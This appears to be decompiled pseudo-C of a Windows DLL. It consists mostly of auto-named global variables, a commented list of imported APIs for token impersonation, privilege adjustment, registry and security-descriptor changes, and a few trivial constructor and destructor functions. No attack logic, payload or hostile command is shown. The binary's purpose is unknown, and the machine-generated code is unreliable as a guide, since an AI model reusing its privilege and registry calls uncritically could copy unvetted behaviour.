_UNKNOWN unk_10183536; // weak
_DWORD dword_10183543[4] = { 0, 0, 0, 0 }; // weak
_BYTE byte_10183553[25] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
_DWORD dword_1018356C[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_1018357C[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_1018358C; // weak
_DWORD dword_101835A1[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_101835B1; // weak
_DWORD dword_101835BE[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_101835CE; // weak
_DWORD dword_101835D7[4] = { 0, 0, 0, 0 }; // weak
int (__cdecl *dword_101835E8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall **off_101835EC)(void *Block, char) = &off_10102A2C; // weak
int dword_101835F0 = 0; // weak
int (__thiscall **off_101835F4)(void *Block, char) = &off_10102C50; // weak
int dword_101835F8 = 0; // weak
int (__thiscall **off_101835FC)(void *Block, char) = &off_10102F04; // weak
int dword_10183600 = 0; // weak
int (__thiscall **off_10183604)(void *Block, char) = &off_10103210; // weak
int dword_10183608 = 0; // weak
int (__thiscall **off_1018360C)(void *Block, char) = &off_10104484; // weak
int dword_10183610 = 0; // weak
int (__thiscall **off_10183614)(void *Block, char) = &off_10104770; // weak
int dword_10183618 = 0; // weak
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *RevertToSelf)();
// extern BOOL (__stdcall *ImpersonateLoggedOnUser)(HANDLE hToken);
// extern BOOL (__stdcall *LookupAccountSidW)(LPCWSTR lpSystemName, PSID Sid, LPWSTR Name, LPDWORD cchName, LPWSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern BOOL (__stdcall *LookupPrivilegeValueW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
// extern LSTATUS (__stdcall *RegEnumKeyExW)(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegEnumValueW)(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern BOOL (__stdcall *OpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
// extern BOOL (__stdcall *GetSecurityDescriptorSacl)(PSECURITY_DESCRIPTOR pSecurityDescriptor, LPBOOL lpbSaclPresent, PACL *pSacl, LPBOOL lpbSaclDefaulted);
// extern DWORD (__stdcall *SetNamedSecurityInfoW)(LPWSTR pObjectName, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// extern LSTATUS (__stdcall *RegCreateKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// extern LSTATUS (__stdcall *RegQueryValueExW)(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegQueryInfoKeyW)(HKEY hKey, LPWSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegDeleteKeyW)(HKEY hKey, LPCWSTR lpSubKey);
// extern LSTATUS (__stdcall *RegQueryInfoKeyA)(HKEY hKey, LPSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegConnectRegistryW)(LPCWSTR lpMachineName, HKEY hKey, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegDeleteValueW)(HKEY hKey, LPCWSTR lpValueName);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegOpenCurrentUser)(REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern HRESULT (__stdcall *VariantClear)(VARIANTARG *pvarg);
// extern void (__stdcall *VariantInit)(VARIANTARG *pvarg);
// extern BOOL (__stdcall *SetupDiGetDeviceInterfaceDetailW)(HDEVINFO DeviceInfoSet, PSP_DEVICE_INTERFACE_DATA DeviceInterfaceData, PSP_DEVICE_INTERFACE_DETAIL_DATA_W DeviceInterfaceDetailData, DWORD DeviceInterfaceDetailDataSize, PDWORD RequiredSize, PSP_DEVINFO_DATA DeviceInfoData);
// extern BOOL (__stdcall *SetupDiDestroyDeviceInfoList)(HDEVINFO DeviceInfoSet);
// extern BOOL (__stdcall *SetupDiEnumDeviceInterfaces)(HDEVINFO DeviceInfoSet, PSP_DEVINFO_DATA DeviceInfoData, const GUID *InterfaceClassGuid, DWORD MemberIndex, PSP_DEVICE_INTERFACE_DATA DeviceInterfaceData);
// extern BOOL (__stdcall *SetupDiGetDeviceInterfaceDetailA)(HDEVINFO DeviceInfoSet, PSP_DEVICE_INTERFACE_DATA DeviceInterfaceData, PSP_DEVICE_INTERFACE_DETAIL_DATA_A DeviceInterfaceDetailData, DWORD DeviceInterfaceDetailDataSize, PDWORD RequiredSize, PSP_DEVINFO_DATA DeviceInfoData);
// extern HDEVINFO (__stdcall *SetupDiGetClassDevsW)(const GUID *ClassGuid, PCWSTR Enumerator, HWND hwndParent, DWORD Flags);
// extern BOOL (__stdcall *PathRemoveFileSpecW)(LPWSTR pszPath);
// extern BOOL (__stdcall *PathIsDirectoryW)(LPCWSTR pszPath);
// extern LPWSTR (__stdcall *PathFindExtensionW)(LPCWSTR pszPath);
// extern int (__stdcall *StrToIntW)(PCWSTR pszSrc);
// extern int (__stdcall *StrToIntA)(PCSTR pszSrc);
// extern BOOL (__stdcall *PostThreadMessageA)(DWORD idThread, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *CreateEnvironmentBlock)(LPVOID *lpEnvironment, HANDLE hToken, BOOL bInherit);
// extern BOOL (__stdcall *DestroyEnvironmentBlock)(LPVOID lpEnvironment);
// extern HRESULT (__stdcall *CreateStreamOnHGlobal)(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm);
// extern void (__stdcall *CoUninitialize)();
// extern HRESULT (__stdcall *FreePropVariantArray)(ULONG cVariants, PROPVARIANT *rgvars);
// extern HRESULT (__stdcall *StgOpenStorageEx)(const WCHAR *pwcsName, DWORD grfMode, DWORD stgfmt, DWORD grfAttrs, STGOPTIONS *pStgOptions, PSECURITY_DESCRIPTOR pSecurityDescriptor, const IID *const riid, void **ppObjectOpen);
// extern HRESULT (__stdcall *CoInitializeSecurity)(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc, SOLE_AUTHENTICATION_SERVICE *asAuthSvc, void *pReserved1, DWORD dwAuthnLevel, DWORD dwImpLevel, void *pAuthList, DWORD dwCapabilities, void *pReserved3);
// extern HRESULT (__stdcall *CoInitializeEx)(LPVOID pvReserved, DWORD dwCoInit);
// extern HRESULT (__stdcall *StgOpenStorage)(const WCHAR *pwcsName, IStorage *pstgPriority, DWORD grfMode, SNB snbExclude, DWORD reserved, IStorage **ppstgOpen);
int dword_101837D4 = 0; // weak
int (__stdcall *dword_101837D8)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_101837DC)(_DWORD, _DWORD) = NULL; // weak
_DWORD dword_101837E0[3] = { 0, 0, 0 }; // weak
int dword_10183804; // weak
int dword_10183824; // weak
int dword_10183830; // weak
int dword_10183B8C; // weak
int dword_10183CE4; // weak
int dword_1018417C; // weak
int dword_10184188; // weak
int dword_1018418C; // weak
int dword_101841CC; // weak
int dword_101841D0; // weak
int dword_101841D4; // weak
int dword_101841D8; // weak
int dword_101841DC; // weak
char byte_101842E0; // weak
char byte_101842E1; // weak
char byte_101842E2; // weak
char byte_101842E3; // weak
int dword_101842E4; // weak
int dword_101842E8; // weak
int dword_101842EC; // weak
int dword_101842F0; // weak
int dword_101842F4; // weak
_UNKNOWN unk_101842F8; // weak
int dword_1018430C; // weak
int dword_10184310; // weak
int dword_10184314; // weak
int dword_10184318; // weak
int dword_1018431C; // weak
int dword_10184320; // weak
int dword_10184324; // weak
int dword_10184328; // weak
int dword_1018432C; // weak
int dword_10184330; // weak
int dword_10184334; // weak
char byte_10184338; // weak
char byte_10184339; // weak
char byte_1018433A; // weak
char byte_1018433B[256]; // weak
char byte_1018443B; // weak
int dword_1018443C; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
_UNKNOWN unk_10184620; // weak
_UNKNOWN unk_1018471E; // weak
_UNKNOWN unk_10184720; // weak
int dword_10185320; // weak
int dword_10185324; // weak
int dword_10185328; // weak
void *dword_1018532C; // idb
char byte_10185330[]; // weak
char byte_10185332[]; // weak
char byte_10185333; // weak
char byte_10185334[256]; // weak
int dword_10185434; // weak
int dword_10185438; // weak
int dword_1018543C; // weak
char byte_10185440[]; // weak
char byte_10185441; // weak
_UNKNOWN unk_10185442; // weak
_UNKNOWN unk_1018544B; // weak
char byte_1018553F[]; // weak
char byte_10185540[40]; // weak
int dword_10185568; // weak
int dword_1018556C; // weak
unsigned __int8 byte_10185570[128]; // weak
int dword_101855F0; // weak
int dword_101855F4; // weak
int dword_101855F8; // weak
int dword_101855FC; // weak
char byte_10185600[]; // weak
int dword_10185700; // weak
int dword_10185704; // weak
int dword_10185708; // weak
int dword_1018570C; // weak
_UNKNOWN unk_10185710; // weak
int dword_10186390; // weak
int dword_10186394; // weak
_UNKNOWN unk_1018639B; // weak
int dword_101863EC; // weak
int dword_101863F0; // weak
char byte_101863F4; // weak
_UNKNOWN unk_101863F5; // weak
_UNKNOWN unk_101863F6; // weak
int dword_101863F8; // weak
int dword_101863FC; // weak
int dword_10186400; // weak
__int64 qword_10186408; // weak
int dword_10186410; // weak
int dword_10186414; // weak
int dword_10186418; // weak
int dword_1018641C; // weak
int dword_10186420; // weak
int dword_10186424; // weak
int dword_10186428; // weak
int dword_1018642C; // weak
int (*dword_10186430)(void); // weak
int (*dword_10186434)(void); // weak
_UNKNOWN unk_10186438; // weak
_UNKNOWN unk_10186439; // weak
_UNKNOWN unk_1018643A; // weak
_UNKNOWN unk_1018643B; // weak
int dword_1018643C; // weak
int dword_10186440[]; // weak
_UNKNOWN unk_10186464; // weak
int dword_10186488; // weak
LONG Destination; // idb
_UNKNOWN unk_10186490; // weak
_UNKNOWN unk_10186491; // weak
_UNKNOWN unk_10186492; // weak
_UNKNOWN unk_10186493; // weak
_UNKNOWN unk_10186494; // weak
_UNKNOWN unk_10186495; // weak
int dword_10186498; // weak
int dword_1018649C; // weak
int dword_101864A0; // weak
void *dword_101864A4; // idb
int dword_101864A8; // weak
int dword_101864AC; // weak
void *dword_101864B0; // idb
int dword_101864B4; // weak
int dword_101864B8; // weak
void *dword_101864BC; // idb
int dword_101864C0; // weak
int dword_101864C4; // weak
int dword_101864C8; // weak
int dword_101864CC; // weak
int dword_101864D0; // weak
_DWORD dword_101864D4[2]; // weak
_DWORD dword_101864DC[2]; // weak
_DWORD dword_101864E4[2]; // weak
_DWORD dword_101864EC[2]; // weak
_DWORD dword_101864F4[2]; // weak
_DWORD dword_101864FC[2]; // weak
_DWORD dword_10186504[2]; // weak
_DWORD dword_1018650C[2]; // weak
_DWORD dword_10186514[2]; // weak
_DWORD dword_1018651C[2]; // weak
_DWORD dword_10186524[2]; // weak
_DWORD dword_1018652C[2]; // weak
_DWORD dword_10186534[2]; // weak
_DWORD dword_1018653C[2]; // weak
_DWORD dword_10186544[2]; // weak
_DWORD dword_1018654C[2]; // weak
_DWORD dword_10186554[2]; // weak
_DWORD dword_1018655C[2]; // weak
_DWORD dword_10186564[2]; // weak
_DWORD dword_1018656C[2]; // weak
_DWORD dword_10186574[2]; // weak
_DWORD dword_1018657C[2]; // weak
_DWORD dword_10186584[2]; // weak
_DWORD dword_1018658C[2]; // weak
_DWORD dword_10186594[2]; // weak
_DWORD dword_1018659C[2]; // weak
_DWORD dword_101865A4[2]; // weak
_DWORD dword_101865AC[2]; // weak
_DWORD dword_101865B4[2]; // weak
_DWORD dword_101865BC[2]; // weak
_DWORD dword_101865C4[2]; // weak
_DWORD dword_101865CC[2]; // weak
_DWORD dword_101865D4[2]; // weak
_DWORD dword_101865DC[2]; // weak
_DWORD dword_101865E4[2]; // weak
_DWORD dword_101865EC[2]; // weak
_DWORD dword_101865F4[2]; // weak
_DWORD dword_101865FC[2]; // weak
_DWORD dword_10186604[2]; // weak
_DWORD dword_1018660C[2]; // weak
_DWORD dword_10186614[2]; // weak
_DWORD dword_1018661C[2]; // weak
_DWORD dword_10186624[2]; // weak
_DWORD dword_1018662C[2]; // weak
_DWORD dword_10186634[2]; // weak
_DWORD dword_1018663C[2]; // weak
_DWORD dword_10186644[2]; // weak
_DWORD dword_1018664C[2]; // weak
_DWORD dword_10186654[2]; // weak
_DWORD dword_1018665C[2]; // weak
_DWORD dword_10186664[2]; // weak
_DWORD dword_1018666C[2]; // weak
_DWORD dword_10186674[2]; // weak
_DWORD dword_1018667C[2]; // weak
_DWORD dword_10186684[2]; // weak
_DWORD dword_1018668C[2]; // weak
_DWORD dword_10186694[2]; // weak
_DWORD dword_1018669C[2]; // weak
_DWORD dword_101866A4[2]; // weak
_DWORD dword_101866AC[2]; // weak
_DWORD dword_101866B4[2]; // weak
_DWORD dword_101866BC[2]; // weak
_DWORD dword_101866C4[2]; // weak
_DWORD dword_101866CC[2]; // weak
_DWORD dword_101866D4[2]; // weak
_DWORD dword_101866DC[2]; // weak
_DWORD dword_101866E4[2]; // weak
_DWORD dword_101866EC[2]; // weak
_DWORD dword_101866F4[2]; // weak
_DWORD dword_101866FC[2]; // weak
_DWORD dword_10186704[2]; // weak
_DWORD dword_1018670C[2]; // weak
_DWORD dword_10186714[2]; // weak
_DWORD dword_1018671C[2]; // weak
_DWORD dword_10186724[2]; // weak
_DWORD dword_1018672C[2]; // weak
_DWORD dword_10186734[2]; // weak
_DWORD dword_1018673C[2]; // weak
_DWORD dword_10186744[2]; // weak
_DWORD dword_1018674C[2]; // weak
_DWORD dword_10186754[2]; // weak
_DWORD dword_1018675C[2]; // weak
_DWORD dword_10186764[2]; // weak
_DWORD dword_1018676C[2]; // weak
_DWORD dword_10186774[2]; // weak
_DWORD dword_1018677C[2]; // weak
_DWORD dword_10186784[2]; // weak
_DWORD dword_1018678C[2]; // weak
_DWORD dword_10186794[2]; // weak
_DWORD dword_1018679C[2]; // weak
_DWORD dword_101867A4[2]; // weak
_DWORD dword_101867AC[2]; // weak
_DWORD dword_101867B4[2]; // weak
_DWORD dword_101867BC[2]; // weak
_DWORD dword_101867C4[2]; // weak
_DWORD dword_101867CC[2]; // weak
_DWORD dword_101867D4[2]; // weak
_DWORD dword_101867DC[2]; // weak
_DWORD dword_101867E4[2]; // weak
_DWORD dword_101867EC[2]; // weak
_DWORD dword_101867F4[2]; // weak
_DWORD dword_101867FC[2]; // weak
_DWORD dword_10186804[2]; // weak
_DWORD dword_1018680C[2]; // weak
_DWORD dword_10186814[2]; // weak
_DWORD dword_1018681C[2]; // weak
int dword_10186824; // weak
_DWORD dword_1018682C[2]; // weak
_DWORD dword_10186834[2]; // weak
_DWORD dword_1018683C[2]; // weak
_DWORD dword_10186844[4]; // weak
_DWORD dword_10186854[2]; // weak
_DWORD dword_1018685C[4]; // weak
int dword_1018686C; // weak
volatile LONG *Block; // idb
_DWORD dword_10186874[2]; // weak
_DWORD dword_1018687C[2]; // weak
int dword_10186884; // weak
int dword_10186888; // idb
int dword_1018688C[4]; // weak
int dword_1018689C; // weak
int dword_101868A0; // weak
_DWORD dword_101868A4[2]; // weak
_DWORD dword_101868AC[2]; // weak
_DWORD dword_101868B4[2]; // weak
_DWORD dword_101868BC[2]; // weak
_DWORD dword_101868C4[2]; // weak
_DWORD dword_101868CC[2]; // weak
_DWORD dword_101868D4[2]; // weak
_DWORD dword_101868DC[2]; // weak
_DWORD dword_101868E4[2]; // weak
_DWORD dword_101868EC[2]; // weak
_DWORD dword_101868F4[2]; // weak
_DWORD dword_101868FC[2]; // weak
_DWORD dword_10186904[5]; // weak
_DWORD dword_10186918[2]; // weak
_DWORD dword_10186920[2]; // weak
_DWORD dword_10186928[2]; // weak
_DWORD dword_10186930[2]; // weak
_DWORD dword_10186938[2]; // weak
_DWORD dword_10186940[2]; // weak
_DWORD dword_10186948[2]; // weak
_DWORD dword_10186950[2]; // weak
_DWORD dword_10186958[2]; // weak
_DWORD dword_10186960[2]; // weak
_DWORD dword_10186968[2]; // weak
_DWORD dword_10186970[2]; // weak
_DWORD dword_10186978[2]; // weak
_DWORD dword_10186980[2]; // weak
_DWORD dword_10186988[2]; // weak
_DWORD dword_10186990[2]; // weak
_DWORD dword_10186998[2]; // weak
_DWORD dword_101869A0[2]; // weak
_DWORD dword_101869A8[2]; // weak
_DWORD dword_101869B0[2]; // weak
_DWORD dword_101869B8[2]; // weak
_DWORD dword_101869C0[2]; // weak
_DWORD dword_101869C8[2]; // weak
_DWORD dword_101869D0[2]; // weak
_DWORD dword_101869D8[2]; // weak
_DWORD dword_101869E0[2]; // weak
_DWORD dword_101869E8[2]; // weak
_DWORD dword_101869F0[2]; // weak
_DWORD dword_101869F8[2]; // weak
_DWORD dword_10186A00[2]; // weak
_DWORD dword_10186A08[2]; // weak
_DWORD dword_10186A10[2]; // weak
_DWORD dword_10186A18[2]; // weak
_DWORD dword_10186A20[2]; // weak
_DWORD dword_10186A28[2]; // weak
_DWORD dword_10186A30[2]; // weak
_DWORD dword_10186A38[2]; // weak
_DWORD dword_10186A40[2]; // weak
_DWORD dword_10186A48[2]; // weak
_DWORD dword_10186A50[2]; // weak
_DWORD dword_10186A58[2]; // weak
_DWORD dword_10186A60[2]; // weak
_DWORD dword_10186A68[2]; // weak
_DWORD dword_10186A70[2]; // weak
_DWORD dword_10186A78[2]; // weak
_DWORD dword_10186A80[2]; // weak
_DWORD dword_10186A88[2]; // weak
_DWORD dword_10186A90[2]; // weak
_DWORD dword_10186A98[2]; // weak
_DWORD dword_10186AA0[2]; // weak
_DWORD dword_10186AA8[2]; // weak
_DWORD dword_10186AB0[2]; // weak
_DWORD dword_10186AB8[2]; // weak
_DWORD dword_10186AC0[2]; // weak
_DWORD dword_10186AC8[2]; // weak
_DWORD dword_10186AD0[2]; // weak
_DWORD dword_10186AD8[2]; // weak
_DWORD dword_10186AE0[2]; // weak
_DWORD dword_10186AE8[2]; // weak
_DWORD dword_10186AF0[2]; // weak
_DWORD dword_10186AF8[2]; // weak
_DWORD dword_10186B00[2]; // weak
_DWORD dword_10186B08[2]; // weak
_DWORD dword_10186B10[2]; // weak
_DWORD dword_10186B18[2]; // weak
_DWORD dword_10186B20[2]; // weak
_DWORD dword_10186B28[2]; // weak
_DWORD dword_10186B30[2]; // weak
_DWORD dword_10186B38[2]; // weak
_DWORD dword_10186B40[2]; // weak
_DWORD dword_10186B48[2]; // weak
_DWORD dword_10186B50[2]; // weak
_DWORD dword_10186B58[2]; // weak
_DWORD dword_10186B60[2]; // weak
_DWORD dword_10186B68[2]; // weak
_DWORD dword_10186B70[2]; // weak
_DWORD dword_10186B78[2]; // weak
_DWORD dword_10186B80[2]; // weak
_DWORD dword_10186B88[2]; // weak
_DWORD dword_10186B90[2]; // weak
_DWORD dword_10186B98[2]; // weak
_DWORD dword_10186BA0[2]; // weak
_DWORD dword_10186BA8[2]; // weak
_DWORD dword_10186BB0[2]; // weak
_DWORD dword_10186BB8[2]; // weak
_DWORD dword_10186BC0[2]; // weak
_DWORD dword_10186BC8[2]; // weak
_DWORD dword_10186BD0[2]; // weak
_DWORD dword_10186BD8[2]; // weak
_DWORD dword_10186BE0[2]; // weak
_DWORD dword_10186BE8[2]; // weak
_DWORD dword_10186BF0[2]; // weak
int dword_10186BF8; // weak
int dword_10186BFC; // weak
_DWORD dword_10186C00[2]; // weak
_DWORD dword_10186C08[2]; // weak
_DWORD dword_10186C10[3]; // weak
int dword_10186C1C; // weak
_DWORD dword_10186C24[2]; // weak
_DWORD dword_10186C2C[2]; // weak
_DWORD dword_10186C34[2]; // weak
_DWORD dword_10186C3C[2]; // weak
_DWORD dword_10186C44[2]; // weak
_DWORD dword_10186C4C[2]; // weak
_DWORD dword_10186C54[2]; // weak
_DWORD dword_10186C5C[2]; // weak
_DWORD dword_10186C64[2]; // weak
_DWORD dword_10186C6C[2]; // weak
int dword_10186C74; // weak
int dword_10186C88; // weak
_DWORD dword_10186C9C[2]; // weak
int dword_10186CA4; // weak
int dword_10186CA8; // weak
int dword_10186CAC; // weak
int dword_10186CB0; // weak
int dword_10186CB4; // weak
int dword_10186CB8; // weak
int dword_10186CBC; // weak
_DWORD dword_10186CC0[2]; // weak
_DWORD dword_10186CC8[2]; // weak
_DWORD dword_10186CD0[2]; // weak
_DWORD dword_10186CD8[2]; // weak
int dword_10186CE0; // weak
int dword_10186CE4; // weak
int dword_10186CE8; // weak
_DWORD dword_10186CEC[2]; // weak
_DWORD dword_10186CF4[2]; // weak
_DWORD dword_10186CFC[2]; // weak
_DWORD dword_10186D04[2]; // weak
_DWORD dword_10186D0C[2]; // weak
_DWORD dword_10186D14[2]; // weak
_DWORD dword_10186D1C[5]; // weak
_DWORD dword_10186D30[3]; // weak
int dword_10186D3C; // weak
_DWORD dword_10186D44[3]; // weak
int dword_10186D50; // weak
_DWORD dword_10186D58[3]; // weak
int dword_10186D64; // weak
_DWORD dword_10186D6C[2]; // weak
_DWORD dword_10186D74[5]; // weak
_DWORD dword_10186D88[3]; // weak
int dword_10186D94; // weak
_DWORD dword_10186D9C[5]; // weak
int dword_10186DB0; // weak
int dword_10186DB4; // weak
_DWORD dword_10186DB8[5]; // weak
_DWORD dword_10186DCC[5]; // weak
_DWORD dword_10186DE0[3]; // weak
int dword_10186DEC; // weak
_DWORD dword_10186DF4[3]; // weak
size_t dword_10186E00; // idb
_DWORD dword_10186E08[3]; // weak
int dword_10186E14; // weak
int dword_10186E1C; // weak
int dword_10186E20; // weak
int dword_10186E24; // weak
_DWORD dword_10186E30[3]; // weak
size_t dword_10186E3C; // idb
int dword_10186E44; // weak
int dword_10186E48; // weak
_DWORD dword_10186E4C[5]; // weak
_DWORD dword_10186E60[5]; // weak
_DWORD dword_10186E74[3]; // weak
int dword_10186E80; // weak
_DWORD dword_10186E88[3]; // weak
int dword_10186E94; // weak
_DWORD dword_10186E9C[3]; // weak
size_t Size; // idb
_DWORD dword_10186EB0[5]; // weak
_DWORD dword_10186EC4[2]; // weak
_DWORD dword_10186ECC[2]; // weak
_DWORD dword_10186ED4[2]; // weak
_DWORD dword_10186EDC[2]; // weak
_DWORD dword_10186EE4[2]; // weak
_DWORD dword_10186EEC[2]; // weak
_DWORD dword_10186EF4[2]; // weak
_DWORD dword_10186EFC[5]; // weak
int dword_10186F10[5]; // weak
_DWORD dword_10186F24[3]; // weak
int dword_10186F30; // weak
_DWORD dword_10186F38[3]; // weak
int dword_10186F44; // weak
int dword_10186F4C; // weak
int dword_10186F50; // weak
_DWORD dword_10186F54[2]; // weak
_DWORD dword_10186F5C[5]; // weak
_DWORD dword_10186F70[5]; // weak
_DWORD dword_10186F84[5]; // weak
_DWORD dword_10186F98[3]; // weak
int dword_10186FA4; // weak
_DWORD dword_10186FAC[5]; // weak
_DWORD dword_10186FC0[3]; // weak
int dword_10186FCC; // weak
_DWORD dword_10186FD4[3]; // weak
int dword_10186FE0; // weak
_DWORD dword_10186FE8[5]; // weak
_DWORD dword_10186FFC[3]; // weak
int dword_10187008; // weak
_DWORD dword_10187010[2]; // weak
_DWORD dword_10187018[2]; // weak
int dword_10187020; // weak
int dword_10187024; // weak
_DWORD dword_10187028[5]; // weak
_DWORD dword_1018703C[3]; // weak
int dword_10187048; // weak
_DWORD dword_10187050[5]; // weak
_DWORD dword_10187064[5]; // weak
_DWORD dword_10187078[2]; // weak
_DWORD dword_10187080[2]; // weak
_DWORD dword_10187088[2]; // weak
_DWORD dword_10187090[2]; // weak
int dword_10187098; // weak
int dword_1018709C; // weak
_UNKNOWN unk_101870A0; // weak
int dword_101870A4[]; // weak
int dword_101870A8[]; // weak
int dword_1019394C; // weak
int dword_10193950; // weak
_DWORD dword_10193954[2]; // weak
_DWORD dword_1019395C[3]; // weak
int dword_10193968; // weak
_DWORD dword_10193970[2]; // weak
_DWORD dword_10193978[2]; // weak
_DWORD dword_10193980[2]; // weak
_DWORD dword_10193988[2]; // weak
_DWORD dword_10193990[2]; // weak
_DWORD dword_10193998[2]; // weak
_DWORD dword_101939A0[2]; // weak
_DWORD dword_101939A8[2]; // weak
_DWORD dword_101939B0[2]; // weak
_DWORD dword_101939B8[2]; // weak
_DWORD dword_101939C0[2]; // weak
_DWORD dword_101939C8[2]; // weak
_DWORD dword_101939D0[2]; // weak
_DWORD dword_101939D8[2]; // weak
_DWORD dword_101939E0[2]; // weak
int dword_101939E8[]; // weak
int dword_101939EC[]; // weak
int dword_101939F0; // weak
int dword_10193B10; // weak
int dword_10193B14; // weak
_UNKNOWN unk_10193B18; // weak
int dword_10193B1C; // weak
int dword_10193B20; // weak
int dword_10193B24; // weak
int dword_10193B28; // weak
int dword_10193B2C; // weak
int dword_10193B30; // weak
int dword_10193B34; // weak
int dword_10193B38; // weak
int dword_10193B3C; // weak
LONG dword_10193B40; // weak
_DWORD dword_10193B44[4]; // weak
int dword_10193B54[8]; // weak
_DWORD dword_10193B74[2]; // weak
LONG dword_10193B7C; // weak
int dword_10193B80; // weak
_DWORD dword_10193B84[2]; // weak
_DWORD dword_10193B8C[3]; // weak
LONG dword_10193B98[8]; // weak
_DWORD dword_10193BB8[4]; // weak
_DWORD dword_10193BC8[4]; // weak
_DWORD dword_10193BD8[2]; // weak
LONG dword_10193BE0[6]; // weak
char byte_10193BF8[32]; // weak
int dword_10193C18[9]; // weak
_DWORD dword_10193C3C[3]; // weak
int dword_10193C48[9]; // weak
int dword_10193C6C[9]; // weak
int dword_10193C90[10]; // weak
LONG dword_10193CB8[18]; // weak
_DWORD dword_10193D00[4]; // weak
_DWORD dword_10193D10[2]; // weak
LONG dword_10193D18; // weak
char byte_10193D1C; // weak
_DWORD dword_10193D20[4]; // weak
char byte_10193D30; // weak
char byte_10193D31; // weak
int dword_10193D34; // weak
int dword_10193D38; // weak
int dword_10193D3C; // weak
_DWORD dword_10193D40[2]; // weak
int dword_10193D48[9]; // weak
int dword_10193D6C[9]; // weak
int dword_10194DA4; // weak
int dword_10194EE4; // weak
int dword_10194F00; // weak
int dword_10194F04; // weak
int dword_10194F08; // weak
int dword_10194F0C; // weak
int dword_10194F10; // weak
_UNKNOWN unk_10194F20; // weak


//----- (10001000) --------------------------------------------------------
void *__thiscall sub_10001000(int *this)
{
  *this = (int)off_100FBF48;
  return sub_1004D63B(this);
}
// 100FBF48: using guessed type int (__thiscall *off_100FBF48[2])(void *Block, char);

//----- (10001029) --------------------------------------------------------
int *__thiscall sub_10001029(int *Block, char a2)
{
  sub_10001000(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10001045) --------------------------------------------------------
_DWORD *__stdcall sub_10001045(_DWORD *a1)
{
  volatile LONG *v1; // ecx
  _DWORD *v2; // eax
  int v4[5]; // [esp+Ch] [ebp-30h] BYREF
  int v5[2]; // [esp+20h] [ebp-1Ch] BYREF
  int v6[2]; // [esp+28h] [ebp-14h] BYREF
  int v7; // [esp+38h] [ebp-4h]

  *a1 = &off_101042D0;
  sub_10006814(a1 + 1);
  sub_1000D17D(a1 + 5, &word_101308D0);
  v7 = 2;
  *a1 = off_100FBF48;
  sub_1000D372(v6, (int)&unk_101864D4);
  LOBYTE(v7) = 3;
  sub_1000E111((int)v6);
  sub_10001124(v1, v4, (int)v6);
  LOBYTE(v7) = 4;
  v2 = sub_1000D2FA(v5, 0);
  LOBYTE(v7) = 5;
  sub_10001236(v2 + 1, a1 + 6);
  LOBYTE(v7) = 4;
  sub_1000D3AD(v5);
  LOBYTE(v7) = 3;
  sub_1000B3DF(v4);
